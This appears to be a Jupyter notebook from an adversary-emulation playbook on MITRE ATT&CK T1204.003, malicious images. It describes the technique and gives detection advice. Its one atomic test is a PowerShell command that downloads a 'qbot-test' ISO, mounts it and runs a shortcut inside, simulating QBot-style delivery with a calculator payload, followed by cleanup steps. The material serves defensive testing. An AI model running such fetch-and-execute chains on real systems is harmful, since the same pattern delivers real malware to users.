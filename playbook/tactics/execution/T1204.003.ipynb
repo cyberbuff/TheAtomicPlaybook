{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "0a2dcfce",
   "metadata": {},
   "source": "# T1204.003 - Malicious Image\nAdversaries may rely on a user running a malicious image to facilitate execution. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be backdoored. Backdoored images may be uploaded to a public repository via [Upload Malware](https://attack.mitre.org/techniques/T1608/001), and users may then download and deploy an instance or container from the image without realizing the image is malicious, thus bypassing techniques that specifically achieve Initial Access. This can lead to the execution of malicious code, such as code that executes cryptocurrency mining, in the instance or container.(Citation: Summit Route Malicious AMIs)\n\nAdversaries may also name images a certain way to increase the chance of users mistakenly deploying an instance or container from the image (ex: [Match Legitimate Name or Location](https://attack.mitre.org/techniques/T1036/005)).(Citation: Aqua Security Cloud Native Threat Report June 2021)"
  },
  {
   "cell_type": "markdown",
   "id": "16cb236b",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "39149cc5",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Malicious Execution from Mounted ISO Image",
    "Adversaries may rely on a user running a malicious image to facilitate execution",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.003/src/qbot-test.iso\" -OutFile \"$env:TEMP\\qbot-test.iso\")\nMount-DiskImage -ImagePath \"$env:TEMP\\qbot-test.iso\"\n$mountedpath = (Get-DiskImage -ImagePath \"$env:TEMP\\qbot-test.iso\" | Get-Volume).DriveLetter\n$finalpath = $mountedpath + \":\\\"\ncd $finalpath\n.\\calc.exe.lnk```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8fb7ea0a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1204.003 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "df4c9dae",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nstart-sleep -s 5\nstop-process -Name \"Calculatorapp\" -Force \ndismount-diskimage -ImagePath \"$env:TEMP\\qbot-test.iso\"```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "028e0736",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1204.003 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "a0dbdf00",
   "metadata": {},
   "source": "## Detection\nMonitor the local image registry to make sure malicious images are not added. Track the deployment of new containers, especially from newly built images. Monitor the behavior of containers within the environment to detect anomalous behavior or malicious activity after users deploy from malicious images."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}